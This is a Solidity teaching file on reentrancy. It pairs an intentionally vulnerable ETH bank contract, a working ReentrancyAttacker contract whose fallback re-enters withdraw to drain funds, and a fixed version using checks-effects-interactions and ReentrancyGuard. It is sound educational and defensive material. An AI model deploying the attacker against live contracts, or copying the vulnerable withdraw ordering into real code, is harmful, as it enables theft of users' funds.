// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

// ╔══════════════════════════════════════════════════════════════╗
// ║              SECURITY DEMONSTRATION CONTRACTS                ║
// ║   DO NOT USE VulnerableETHBank IN PRODUCTION — EXPLOITABLE  ║
// ╚══════════════════════════════════════════════════════════════╝

// ─────────────────────────────────────────────────────────────────────────────
// 1. VULNERABLE VERSION — classic reentrancy bug (Interaction before Effect)
// ─────────────────────────────────────────────────────────────────────────────

/// @title VulnerableETHBank
/// @notice INTENTIONALLY INSECURE — demonstrates the classic reentrancy vulnerability
/// @dev The bug: withdraw() sends ETH BEFORE updating the balance (violates CEI).
///      An attacker's fallback function can call withdraw() again before the balance
///      is decremented, draining the contract.
///
///      Root cause: Interaction (ETH transfer) precedes Effect (balance update).
contract VulnerableETHBank {
    mapping(address => uint256) public balances;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    /// @dev BUG: sends ETH first, updates balance second → reentrancy possible
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "nothing to withdraw");

        // INTERACTION before EFFECT ← THE BUG
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");

        // EFFECT after INTERACTION ← too late, attacker already re-entered
        balances[msg.sender] = 0;

        emit Withdrawn(msg.sender, amount);
    }

    receive() external payable {}
}

// ─────────────────────────────────────────────────────────────────────────────
// 2. ATTACKER — exploits VulnerableETHBank
// ─────────────────────────────────────────────────────────────────────────────

/// @title ReentrancyAttacker
/// @notice Demonstrates the reentrancy exploit against VulnerableETHBank
/// @dev The attack:
///      1. Attacker deposits a small amount.
///      2. Attacker calls attack() → triggers withdraw().
///      3. Receive fallback fires before balance is zeroed → calls withdraw() again.
///      4. Repeat until the target is drained.
contract ReentrancyAttacker {
    VulnerableETHBank public immutable target;
    uint256 public stolenAmount;

    event AttackExecuted(uint256 amountStolen);

    constructor(address payable _target) {
        target = VulnerableETHBank(_target);
    }

    /// @notice Fund, attack, and collect. msg.value is the initial deposit.
    function attack() external payable {
        require(msg.value > 0, "need ETH to deposit first");
        target.deposit{value: msg.value}();
        target.withdraw();
        stolenAmount = address(this).balance;
        emit AttackExecuted(stolenAmount);
        // Return stolen funds to caller for demonstration
        (bool ok,) = msg.sender.call{value: stolenAmount}("");
        require(ok, "return failed");
        stolenAmount = 0;
    }

    /// @dev Reentrancy entry point: called by VulnerableETHBank during withdraw()
    receive() external payable {
        if (address(target).balance >= msg.value && msg.value > 0) {
            target.withdraw(); // re-enter before balance is zeroed
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 3. SECURE VERSION — same contract, fixed with CEI + ReentrancyGuard
// ─────────────────────────────────────────────────────────────────────────────

/// @title SecureETHBank
/// @notice Production-safe version of VulnerableETHBank
/// @dev Two complementary defences:
///      A) Checks-Effects-Interactions: balance zeroed BEFORE ETH is sent.
///      B) ReentrancyGuard: nonReentrant modifier makes re-entry revert.
///         Either defence alone is sufficient; both together provide defence-in-depth.
contract SecureETHBank is ReentrancyGuard {
    mapping(address => uint256) public balances;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);

    error NothingToWithdraw();
    error TransferFailed();
    error ZeroDeposit();

    function deposit() external payable {
        if (msg.value == 0) revert ZeroDeposit();
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    /// @notice Withdraw ETH balance — secured by CEI ordering and ReentrancyGuard
    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        if (amount == 0) revert NothingToWithdraw();

        // EFFECT before INTERACTION ← CEI fix
        balances[msg.sender] = 0;

        // INTERACTION last — balance already zeroed, re-entry cannot drain twice
        (bool ok,) = msg.sender.call{value: amount}("");
        if (!ok) revert TransferFailed();

        emit Withdrawn(msg.sender, amount);
    }

    receive() external payable {}
}
